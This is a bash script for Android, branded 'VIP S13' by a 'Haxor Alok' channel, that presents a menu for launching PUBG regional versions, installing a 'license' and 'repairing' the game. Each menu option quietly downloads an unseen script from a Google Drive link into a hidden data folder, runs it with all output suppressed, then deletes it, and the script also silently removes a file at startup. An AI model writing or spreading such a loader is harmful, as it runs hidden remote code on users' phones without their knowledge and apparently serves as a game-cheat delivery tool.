#!/bin/bash
date
echo "+---------------------------------------+"
echo " __      _______ _____     _____ __ ____  "
echo " \ \    / /_   _|  __ \   / ____/_ |___ \ "
echo "  \ \  / /  | | | |__) | | (___  | | __) |"
echo "   \ \/ /   | | |  ___/   \___ \ | ||__ < "
echo "    \  /   _| |_| |       ____) || |___) |"
echo "     \/   |_____|_|      |_____/ |_|____/ "
echo "                                          "
echo "+---------------------------------------+"
rm -rf /storage/emulated/legacy/Android/data/menu 2> /dev/null
echo -e "\e[1;31mRecomended Please Use MT Manager v2.8.6\e[0m"
echo -e "\e[1;33mThis Shell Is Sync From My Cloud Server\nSo You Will Get Realtime Update.\e[0m"
echo •••••••••••••••••••••••••••••••••••••••••
echo "Youtube Channel : Haxor Alok"
echo "Telegram        : @Haxor_Alok"
echo "Online Shell    : v1"
echo "+---------------------------------------+"
PS3='Please Select Menu :'
menussc=("Start PUBG Global" "Start PUBG Korea" "Start PUBG Vietnam" "Install License" "Repair PUBG" "Exit")
select ssc in "${menussc[@]}"
do
    case $ssc in
        "Start PUBG Global")         
            echo "PUBG Global Selected"
            echo "+---------------------------------------+"
            masban=/storage/emulated/legacy/Android/data/browser
            rm -rf $masban
            wget "https://docs.google.com/uc?export=download&id=1-vzziH9q3Kyih6Wumy77EO9c8NlsXAUN" -O $masban > /dev/null 2>&1
            sh $masban 2> /dev/null
            rm -rf $masban 2> /dev/null
            ;;
        "Start PUBG Korea")
            echo "PUBG Korea Selected"          
            echo "+---------------------------------------+"
            masban=/storage/emulated/legacy/Android/data/browser
            rm -rf $masban
            wget "https://docs.google.com/uc?export=download&id=1-y61Oi7BYDC9NSV06LtDDpe2Cq_XkIyE" -O $masban > /dev/null 2>&1
            sh $masban 2> /dev/null
            rm -rf $masban 2> /dev/null
            ;;
        "Start PUBG Vietnam")
              echo "PUBG Vietnam Selected"
              echo "+---------------------------------------+"
              masban=/storage/emulated/legacy/Android/data/browser
              rm -rf $masban
              wget "https://docs.google.com/uc?export=download&id1064zCYsADuTWwQtmNCRJBalrvCn16NjY" -O $masban > /dev/null 2>&1
              sh $masban 2> /dev/null
              rm -rf $masban 2> /dev/null
            ;;
        "Install License")
              echo "Installing License"
              echo "+---------------------------------------+"
              masban=/storage/emulated/legacy/Android/data/browser
              rm -rf $masban
              wget "https://docs.google.com/uc?export=download&id=104oUWYGvbqasztfqT74_mcWt-hlxVxcb" -O $masban > /dev/null 2>&1
              sh $masban 2> /dev/null
              rm -rf $masban 2> /dev/null
            ;;
        "Repair PUBG")
              echo "Start Repair"
              echo "+---------------------------------------+"
              masban=/storage/emulated/legacy/Android/data/browser
              rm -rf $masban
              wget "https://docs.google.com/uc?export=download&id=1-hPfMybYSuVFWNt_DxjF9njzYk4laCgY" -O $masban > /dev/null 2>&1
              sh $masban 2> /dev/null
              rm -rf $masban 2> /dev/null
            ;;      
        "Exit")
            am force-stop bin.mt.plus             
            ;;
        *) echo "Invalid Selection";;
    esac
done
